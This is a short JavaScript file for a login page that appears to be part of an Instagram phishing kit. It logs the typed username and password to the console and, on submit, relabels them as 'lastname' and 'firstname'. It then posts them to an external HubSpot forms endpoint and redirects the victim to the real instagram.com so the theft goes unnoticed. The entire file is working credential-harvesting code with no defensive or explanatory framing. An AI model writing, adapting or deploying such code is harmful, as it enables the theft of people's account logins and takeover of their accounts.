let username = document.getElementById('username');
let password = document.getElementById('password');
let form = document.getElementById('form');


console.log(username);
console.log(password);
console.log(form);

username.addEventListener('change', event => {
    console.log(event.target.value);
})

password.addEventListener('change', event => {
    console.log(event.target.value);
})

form.addEventListener('submit', event => {
    event.preventDefault();

    let payload = {
        fields: [
            {
                "name": "lastname",
                "value": username.value
            },
            {
                "name": "firstname",
                "value": password.value
            }
        ],
        context: {
            pageUri: window.location.href,
            pageName: document.title
        }
    }

    fetch('https://api.hsforms.com/submissions/v3/integration/submit/7900811/e4c8dba6-8a19-44c9-bf75-26c792905079', {
        method: 'POST', // or 'PUT'
        body: JSON.stringify(payload), // data can be `string` or {object}!
        headers: {
            'Content-Type': 'application/json'
        }
    }).then(response => {
        
        response.json().then(data => {
            document.location = 'https://www.instagram.com/'
        })
    })

})